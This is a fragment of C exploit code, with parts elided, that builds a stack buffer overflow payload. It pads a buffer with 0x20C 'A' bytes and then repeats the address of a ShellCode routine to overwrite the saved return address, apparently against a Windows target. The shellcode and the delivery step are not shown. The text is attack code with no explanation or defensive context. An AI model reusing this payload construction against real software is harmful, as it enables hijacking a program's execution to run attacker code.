...
int main(){
    ...
    char input_buffer[0x224] = {'0'};
    char output_buffer[0x80] = {'0'};

    for(int i = 0; i < 0x20C; i++){
        input_buffer[i] = 'A';
    }
    *(DWORD*)(input_buffer + 0x20C) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer + 0x210) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer + 0x214) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer + 0x218) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer + 0x21C) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer + 0x220) = (DWORD)&ShellCode;
